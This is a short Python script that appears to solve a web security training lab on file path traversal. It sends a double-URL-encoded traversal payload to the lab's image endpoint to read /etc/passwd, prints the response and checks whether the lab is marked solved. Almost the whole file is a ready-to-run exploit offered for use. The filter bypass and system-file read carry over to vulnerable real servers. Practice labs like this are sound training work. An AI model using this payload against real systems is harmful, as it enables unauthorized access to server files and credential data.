import requests
import argparse
from urllib.parse import quote

parser = argparse.ArgumentParser(description='Solves the following Lab: File path traversal, traversal sequences stripped with superfluous URL-decode')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

r = requests.get("https://" + lab.id + ".web-security-academy.net/image?filename=" + quote("%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc/passwd", safe=''))
print(r.text)

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab")